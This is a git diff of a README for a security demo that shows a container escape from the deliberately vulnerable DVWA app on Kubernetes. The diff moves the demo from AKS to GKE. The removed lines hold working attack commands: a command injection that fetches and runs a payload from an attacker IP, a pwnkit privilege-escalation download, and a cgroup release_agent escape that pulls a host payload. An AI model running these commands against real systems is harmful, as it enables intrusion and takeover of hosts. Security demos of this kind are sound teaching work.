@@ -1,4 +1,4 @@
-# AKS container escape demo
+# GKE container escape demo
 
 DVWA is the "Damn Vulnerable Web Application" that will be used to demonstrate how a vulnerability in a container can lead to access to the host and to the cluster.
 
@@ -11,11 +11,11 @@ This folder contains Terraform automation code to provision the following:
 
 <!-- code_chunk_output -->
 
-- [GKE container escape demo](#aks-container-escape-demo)
+- [GKE container escape demo](#gke-container-escape-demo)
   - [Prerequsites](#prerequsites)
   - [Provision the cluster](#provision-the-cluster)
   - [Connect to the cluster](#connect-to-the-cluster)
-  - [Deploy Mondoo Operator to AKS](#deploy-mondoo-operator-to-aks)
+  - [Deploy Mondoo Operator to GKE](#deploy-mondoo-operator-to-gke)
     - [Deploy cert-manager](#deploy-cert-manager)
     - [Deploy Mondoo Operator](#deploy-mondoo-operator)
   - [Deploy and configure DVWA](#deploy-and-configure-dvwa)
@@ -83,53 +83,23 @@ terraform apply plan.out -auto-approve
 Once the provisioning completes you will see something like this:
 
 ```bash
-Apply complete! Resources: 14 added, 0 changed, 0 destroyed.
+Apply complete! Resources: 16 added, 0 changed, 0 destroyed.
 
 Outputs:
 
-public_ip_address = "13.92.179.31"
-resource_group_name = "rg-Lunalectric-container-escape"
+attacker_vm_name = "lunalectric-attacker-vm-oi71"
 summary = <<EOT
 
-attacker vm public ip: 13.92.179.31
+Connect to attacker VM (in 3-4 separate terminals):
+gcloud compute ssh lunalectric-attacker-vm-oi71
 
-terraform output -raw tls_private_key > id_rsa
-ssh -o StrictHostKeyChecking=no -i id_rsa azureuser@13.92.179.31
+Connect to your GKE cluster via gcloud:
+gcloud container clusters get-credentials lunalectric-gke-cluster-oi71 --region us-central1
 
-export KUBECONFIG="\$\{PWD}/aks-kubeconfig"
-kubectl apply -f dvwa-deployment.yml
+
+kubectl apply -f ../assets/dvwa-deployment.yml
 kubectl port-forward $(kubectl get pods -o name) 8080:80
 
-
-Hacking commands:
-
-dvwa-browser---------------
-
-;curl -vk http://13.92.179.31:8001/met-container -o /tmp/met
-;chmod 777 /tmp/met
-;/tmp/met
-
-privilege-escalation-------
-
-cd /tmp
-curl -vkO https://pwnkit.s3.amazonaws.com/priv-es
-chmod a+x ./priv-es
-./priv-es
-
-container-escape-----------
-
-mkdir -p /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp && mkdir -p /tmp/cgrp/x
-echo 1 > /tmp/cgrp/x/notify_on_release
-echo "$(sed -n 's/.*\upperdir=\([^,]*\).*/\1/p' /proc/mounts)/cmd" > /tmp/cgrp/release_agent
-echo '#!/bin/sh' > /cmd
-echo "curl -vk http://13.92.179.31:8001/met-host -o /tmp/met" >> /cmd
-echo "chmod 777 /tmp/met" >> /cmd
-echo "/tmp/met" >> /cmd
-chmod a+x /cmd
-sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
-
-EOT
-tls_private_key = <sensitive>
 ```
 
 ## Connect to the cluster
@@ -142,9 +112,10 @@ gcloud container clusters get-credentials lunalectric-gke-cluster-$suffix --regi
 
 ```bash
 kubectl get nodes
-NAME                              STATUS   ROLES   AGE   VERSION
-aks-default-41472297-vmss000000   Ready    agent   24m   v1.22.11
-aks-default-41472297-vmss000001   Ready    agent   24m   v1.22.11
+NAME                                                  STATUS   ROLES    AGE   VERSION
+gke-lunalectric-gke--lunalectric-pool-0e144d64-33rz   Ready    <none>   82m   v1.23.16-gke.1400
+gke-lunalectric-gke--lunalectric-pool-b7d2d926-t991   Ready    <none>   83m   v1.23.16-gke.1400
+gke-lunalectric-gke--lunalectric-pool-d85199a0-2484   Ready    <none>   83m   v1.23.16-gke.1400
 ```
 
 ## Deploy Mondoo Operator to GKE
@@ -171,7 +142,7 @@ Copy and paste the install commands from the Mondoo Dashboard to deploy the Mond
 
 ## Deploy and configure DVWA
 
-Deploy the DVWA application to your AKS cluster.
+Deploy the DVWA application to your GKE cluster.
 
 ```bash
 kubectl apply -f ../assets/dvwa-deployment.yml
@@ -188,33 +159,33 @@ dvwa-container-escape   1/1     1            1           47s
 
 ```bash
 kubectl describe pods
-Name:         dvwa-container-escape-5576f8b947-cv7tv
+Name:         dvwa-container-escape-9f5694b84-4rmqp
 Namespace:    default
 Priority:     0
-Node:         aks-default-27813111-vmss000000/10.224.0.4
-Start Time:   Mon, 15 Aug 2022 19:42:30 +0200
+Node:         gke-lunalectric-gke--lunalectric-pool-b7d2d926-t991/10.10.10.4
+Start Time:   Mon, 24 Apr 2023 23:32:42 +0200
 Labels:       app=dvwa-container-escape
-              pod-template-hash=5576f8b947
+              pod-template-hash=9f5694b84
 Annotations:  <none>
 Status:       Running
-IP:           10.244.0.6
+IP:           10.224.1.4
 IPs:
-  IP:           10.244.0.6
-Controlled By:  ReplicaSet/dvwa-container-escape-5576f8b947
+  IP:           10.224.1.4
+Controlled By:  ReplicaSet/dvwa-container-escape-9f5694b84
 Containers:
   dvwa:
-    Container ID:   containerd://1c0239ca76d10dd88a04eecdfd134835f594f0bc5ec143314b833263ae54db60
-    Image:          public.ecr.aws/x6s5a8t7/dvwa:latest
-    Image ID:       public.ecr.aws/x6s5a8t7/dvwa@sha256:8791eab52f1481d10e06bcd8a40188456ea3e5e4760e2f1407563c1e62e251f3
+    Container ID:   containerd://7f2dfdaf3433fe1de07d19b92b9179792be66e3f3d7fe745b3f8992df1dd652d
+    Image:          docker.io/pmuench/dvwa-container-escape
+    Image ID:       docker.io/pmuench/dvwa-container-escape@sha256:a9e098747b285f4047e3662925f2832fbdd61d5e3d68647bbe91062348a529fd
     Port:           80/TCP
     Host Port:      0/TCP
     State:          Running
-      Started:      Mon, 15 Aug 2022 19:43:04 +0200
+      Started:      Mon, 24 Apr 2023 23:33:02 +0200
     Ready:          True
     Restart Count:  0
     Environment:    <none>
     Mounts:
-      /var/run/secrets/kubernetes.io/serviceaccount from kube-api-access-m68hr (ro)
+      /var/run/secrets/kubernetes.io/serviceaccount from kube-api-access-9l7ng (ro)
 Conditions:
   Type              Status
   Initialized       True
@@ -222,7 +193,7 @@ Conditions:
   ContainersReady   True
   PodScheduled      True
 Volumes:
-  kube-api-access-m68hr:
+  kube-api-access-9l7ng:
     Type:                    Projected (a volume that contains injected data from multiple sources)
     TokenExpirationSeconds:  3607
     ConfigMapName:           kube-root-ca.crt
@@ -232,14 +203,8 @@ QoS Class:                   BestEffort
 Node-Selectors:              <none>
 Tolerations:                 node.kubernetes.io/not-ready:NoExecute op=Exists for 300s
                              node.kubernetes.io/unreachable:NoExecute op=Exists for 300s
-Events:
-  Type    Reason     Age   From               Message
-  ----    ------     ----  ----               -------
-  Normal  Scheduled  115s  default-scheduler  Successfully assigned default/dvwa-container-escape-5576f8b947-cv7tv to aks-default-27813111-vmss000000
-  Normal  Pulling    114s  kubelet            Pulling image "public.ecr.aws/x6s5a8t7/dvwa:latest"
-  Normal  Pulled     81s   kubelet            Successfully pulled image "public.ecr.aws/x6s5a8t7/dvwa:latest" in 32.985551672s
-  Normal  Created    81s   kubelet            Created container dvwa
-  Normal  Started    81s   kubelet            Started container dvwa
+Events:                      <none>
+
 ```
 
 ### Configure Port Forwarding
